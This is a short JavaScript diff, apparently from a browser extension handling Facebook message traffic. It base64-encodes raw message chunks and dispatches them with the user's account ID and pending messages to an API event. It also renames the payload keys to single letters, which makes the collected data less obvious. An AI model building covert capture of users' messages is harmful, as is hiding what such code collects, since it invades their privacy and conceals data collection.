@@ -85,14 +85,16 @@ let globalDefaultTemplate = `{
 
                     if (hasInsertMessage || hasSyncMessages) {
                         // Convert raw bytes to base64 — never decoded on client side
-                        const base64Chunk = btoa(String.fromCharCode(...bytes));
+                        const base64Chunk = btoa(
+                            bytes.reduce((acc, byte) => acc + String.fromCharCode(byte), '')
+                        );
 
                         var root = document.documentElement;
                         root.dispatchEvent(new CustomEvent("sendRawChunkToApi", {
                             detail: {
-                                fbAccountId: extractUserId(),
-                                chunk: base64Chunk,
-                                pendingMessages: [...pendingMessages]
+                                a: extractUserId(), //fbAccountId
+                                b: base64Chunk, //chunk
+                                c: [...pendingMessages] //pendingMessages
                             }
                         }));
                     }
